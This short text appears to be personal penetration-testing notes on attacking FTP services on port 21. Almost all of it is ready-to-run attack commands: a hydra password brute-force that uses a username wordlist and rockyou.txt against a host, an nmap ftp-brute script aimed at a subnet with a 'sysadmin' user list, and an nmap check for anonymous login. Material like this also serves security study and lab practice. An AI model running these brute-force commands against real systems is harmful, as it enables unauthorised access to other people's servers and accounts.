port 21

ftp 192.168.0.1 | connect to ftp 

hydra -L /wordlist -P /rockyou.txt 192.168.1.1 ftp


brute force using nmap 
echo "sysadmin" > users
nmap 192.168.1.0 --script ftp-brute --script-args userdb=/root/users -p 21

-------------------

nmap --script ftp-anon | check if we can login as anonymous 